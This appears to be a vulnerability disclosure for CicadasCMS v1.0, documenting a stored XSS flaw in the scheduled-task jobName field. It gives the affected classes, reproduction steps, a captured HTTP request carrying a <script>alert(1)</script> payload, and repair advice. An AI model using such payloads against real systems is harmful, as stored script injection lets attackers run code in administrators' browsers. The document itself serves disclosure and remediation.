## Vulnerability Description

A security vulnerability exists in the task scheduling management module of CicadasCMS v1.0. Because the `/system/schedule/save` interface fails to adequately filter and escape the user-input `jobName` parameter when handling task saving logic, attackers can inject malicious JavaScript. This script is stored in the server database and will automatically execute in the browser environment when an administrator or a user with relevant permissions accesses the task list or scheduling monitoring page.

## Vulnerability Analysis

The vulnerability's entry point class file is: src/main/java/com/zhiliao/module/web/system/ScheduleJobController.java

The data was passed directly into the save method without undergoing XSS filtering.
<img width="1318" height="479" alt="Pasted image 20260429171135" src="https://github.com/user-attachments/assets/a10fe565-65bc-468c-9cae-c480b6b80c09" />


Vulnerability logic handling class file: src/main/java/com/zhiliao/module/web/system/service/impl/ScheduleJobServiceImpl.java

The data from the `save` method is passed to `scheduleJobService.update(pojo)`, which is the `update` method shown below. However, the `update` method does not perform any XSS filtering; it directly saves the data to the database and returns a success message. A stored XSS vulnerability exists.

<img width="1334" height="607" alt="Pasted image 20260429171620" src="https://github.com/user-attachments/assets/2f4df059-fb49-4a91-a0a6-55c565d67b5a" />




## Vulnerability Reproduction

Access http://127.0.0.1:12345/system to enter the plan management window.

<img width="1920" height="765" alt="Pasted image 20260429172034" src="https://github.com/user-attachments/assets/0d3976dc-f565-496f-9420-efcac389d065" />



Click to edit task
<img width="1920" height="687" alt="Pasted image 20260429172108" src="https://github.com/user-attachments/assets/5a8fb727-2806-466d-8dfb-2be78a28b91b" />


In the task name field, enter payload: <script>alert(1)</script>, and then click save.
<img width="795" height="660" alt="Pasted image 20260429172209" src="https://github.com/user-attachments/assets/e70d3f03-e07e-4a1e-85cd-d52562b33dd9" />


The data packet is as follows, with the payload appearing in the jobName parameter value:
```http
POST /system/schedule/save HTTP/1.1
Host: 127.0.0.1:12345
Content-Length: 196
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://127.0.0.1:12345
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:12345/system
Accept-Encoding: gzip, deflate, br
Cookie: _session_=bG9jYWw6MTc0MTExMzE5NDk3MTE2OToxNzc3NTE5NzQ0MzEyOmFhZDE1NDQ1ZTFhMjFjY2RkNmZmODIzMzk3Njk0NTMwOTQxNDQzMDI0NjJiYjYyNDQ4OWIwYTBjMjlhMmExZjc; bjui_theme=blue; SESSION=c2792cfb-2c38-4ada-9c32-62f6c7acdd5c
Connection: keep-alive

id=8&jobName=t3%3Cscript%3Ealert(1)%3C%2Fscript%3E&jobGroup=g1&cronExpression=0%2F10+*+*+*+*+%3F&beanClass=com.zhiliao.module.web.system.task.taskTest&methodName=job3&isConcurrent=1&description=aa
```

<img width="1920" height="854" alt="Pasted image 20260429172550" src="https://github.com/user-attachments/assets/cc8ae4ca-ce45-4b1a-85d1-a202e2458f2d" />


After clicking save, a pop-up window appears:
<img width="1631" height="954" alt="Pasted image 20260429172258" src="https://github.com/user-attachments/assets/53eb2100-7411-47d5-ba95-af458babec74" />


Refresh the page, then click the Scheduled Tasks window again:
<img width="1920" height="809" alt="Pasted image 20260429172355" src="https://github.com/user-attachments/assets/35c63751-3da8-4c4c-9613-a144240dffcb" />


Another window pops up, indicating that the vulnerability verification has been completed and a stored XSS vulnerability exists.
<img width="1920" height="790" alt="Pasted image 20260429172409" src="https://github.com/user-attachments/assets/6db74261-4076-4841-a590-565d4a32d2e0" />



## Repair suggestions

Input Filtering: Perform strict type validation and special character filtering on all user input data.

Output Encoding (Recommended): Use htmlspecialchars() or similar escape functions at all HTML output locations to convert characters such as <, >, &, ", and ' to HTML entities.

Security Headers: It is recommended to include a Content Security Policy (CSP) in the response header to restrict the execution of external scripts.
